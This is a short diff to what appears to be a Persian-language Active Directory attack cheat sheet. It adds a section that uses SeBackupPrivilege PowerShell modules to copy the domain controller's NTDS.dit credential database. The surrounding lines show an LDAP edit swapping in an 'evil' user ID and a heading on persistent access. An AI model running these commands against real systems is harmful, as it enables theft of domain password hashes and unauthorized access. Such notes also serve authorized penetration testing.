@@ -402,6 +402,16 @@ uidNumber: CURRENT USER ID
 replace: EVIL USER ID
 gidNumber: CURRENT GROUP ID
 ```
+### کپی از ndts با استفاده از مجوز SeBackupPrivilege 
+
+```text
+import-module .\SeBackupPrivilegeUtils.dll
+import-module .\SeBackupPrivilegeCmdLets.dll
+Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\temp\ndts.dit
+```
+
+
+
 
 ## دسترسی همیشگی
 
